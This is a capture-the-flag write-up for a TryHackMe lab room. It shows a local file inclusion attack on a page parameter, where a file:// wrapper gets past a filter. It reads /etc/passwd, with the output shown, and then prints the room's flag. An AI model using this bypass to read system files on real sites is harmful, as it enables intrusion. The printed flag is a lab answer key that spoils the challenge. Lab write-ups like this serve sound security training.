---
tags:
  - THM
  - Easy
  - Challenge
  - LFI
---
https://tryhackme.com/room/lofi/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.57.91 lofi.thm
```
# Scanning
The machine's description tells us that there is a website running and that we should find  the flag in the **root of the filesystem**.
# Discovery
The website has a navigation panel with the following links:
- http://lofi.thm/?page=relax.php
- http://lofi.thm/?page=sleep.php
- http://lofi.thm/?page=chill.php
- http://lofi.thm/?page=coffee.php
- http://lofi.thm/?page=vibe.php
- http://lofi.thm/?page=game.php
# Exploitation
If we try to include a file such as `/?page=/etc/passwd`, the website shows:
```text
HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!
```
However, we can include files using wrappers like `/?page=file:///etc/passwd`:
```text
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```
Now, we get the **flag** in the **root's filesystem** at `/?page=file:///flag.txt`:
```text
flag{e4478e0eab69bd642b8238765dcb7d18}
```